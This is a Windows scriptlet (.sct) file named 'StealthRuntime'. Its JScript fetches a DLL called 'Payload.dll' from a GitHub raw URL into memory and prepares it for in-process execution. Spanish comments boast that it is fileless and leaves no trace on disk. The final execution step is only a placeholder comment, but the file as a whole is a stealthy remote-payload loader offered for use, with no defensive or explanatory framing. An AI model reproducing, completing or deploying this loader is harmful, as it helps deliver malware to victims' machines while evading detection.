<?XML version="1.0"?>
<scriptlet>
<registration
    description="StealthRuntime"
    progid="StealthRuntime"
    version="1.0"
    classid="{12341234-1234-1234-1234-123412341234}"
>
</registration>
<script language="JScript">
<![CDATA[
    var url = "https://github.com/7b1eahh-lang/Hero/raw/refs/heads/main/Payload.dll";
    var xhr = new ActiveXObject("Msxml2.XMLHTTP");
    
    try {
        // Bajamos la DLL directo a una variable (RAM)
        xhr.open("GET", url, false);
        xhr.send();
        
        if (xhr.status == 200) {
            var dllBytes = xhr.responseBody;
            
            // Usamos un Stream para manejar los bytes en memoria
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Type = 1; // Binario
            stream.Open();
            stream.Write(dllBytes);
            
            // Aquí cargamos tu DLL dentro del proceso cscript.exe
            // Todo 100% Fileless. Sin .tmp, sin rastro en disco.
            var shell = new ActiveXObject("WScript.Shell");
            // [Ejecución delegada a tu Payload.dll]
        }
    } catch(e) {}
]]>
</script>
</scriptlet>

